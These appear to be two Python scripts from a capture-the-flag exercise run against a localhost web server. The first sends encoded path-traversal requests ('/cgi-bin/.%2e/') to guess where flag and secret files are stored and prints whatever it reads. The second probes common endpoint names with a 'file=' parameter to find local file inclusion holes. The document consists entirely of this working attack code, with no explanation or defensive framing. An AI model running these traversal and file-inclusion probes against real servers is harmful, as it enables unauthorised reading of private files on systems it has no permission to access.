import requests
from requests.exceptions import RequestException

base = 'http://localhost:80/cgi-bin/.%2e/'
prefixes = ['flag','flags','ctf','capture','secret','secrets','hidden','private']
filenames = ['flag','flag.txt','FLAG','FLAG.txt','readme.txt','README','README.txt']

for d in prefixes:
    for f in filenames:
        path = f"{d}/{f}"
        url = base + path
        try:
            r = requests.get(url, allow_redirects=False, timeout=5)
            print(f"{path:25} -> {r.status_code}")
            if r.status_code == 200 and len(r.content) < 5000:
                print(r.text[:300])
        except RequestException as e:
            print(f"{path:25} -> ERROR {e}")

import requests
from requests.exceptions import RequestException

base = 'http://localhost:80'
endpoints = ['download','view','file','get','read','page','include','show','image','img','content']
for ep in endpoints:
    url = f"{base}/{ep}?file=index.html"
    try:
        r = requests.get(url, allow_redirects=False, timeout=5)
        print(f"{ep:10} -> {r.status_code}")
        if r.status_code == 200 and b'<!DOCTYPE html>' in r.content[:200]:
            print(f"Potential LFI endpoint: {url}")
    except RequestException as e:
        print(f"{ep:10} -> ERROR {e}")
